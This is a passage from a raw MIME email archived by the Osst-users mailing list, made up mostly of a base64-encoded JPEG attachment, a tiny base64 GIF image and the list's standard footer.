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
kAPx8Tjyz/zoaWXQw//Z

------=_NextPart_000_0012_AF4A8075.2B92E6D9
Content-Type: image/gif; name="njs.gif"
Content-Transfer-Encoding: base64
Content-ID: <njs.gif>

R0lGODlhAQABAPAAAAAAAAAAACH5BAUAAAAALAAAAAABAAEAAAICRAEAOw==

------=_NextPart_000_0012_AF4A8075.2B92E6D9--


--===============8612058764568203787==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8612058764568203787==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============8612058764568203787==--

